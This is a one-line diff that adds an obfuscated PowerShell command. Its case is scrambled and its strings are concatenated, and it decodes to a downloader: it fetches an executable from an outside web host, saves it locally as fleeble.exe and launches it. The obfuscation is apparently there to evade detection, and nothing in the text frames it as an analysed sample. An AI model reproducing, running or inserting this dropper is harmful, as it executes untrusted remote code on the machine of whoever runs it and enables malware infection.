@@ -1,0 +1,1 @@
+﻿inVOKE-exPRESsIoN ((('('+'New-Obj'+'ec'+'t'+' S'+'yst'+'em'+'.Net.'+'WebC'+'lient)'+'.D'+'ownloa'+'d'+'File({0}'+'http://'+'trold'+'a'+'.'+'5gb'+'fr'+'ee'+'.co'+'m/f'+'os'+'ee/'+'doc.exe{0},{0}f'+'leeble.'+'exe{0'+'})'+';Star'+'t-P'+'roce'+'ss {0}fl'+'eeble'+'.'+'exe{'+'0}')-F [ChAr]39) )
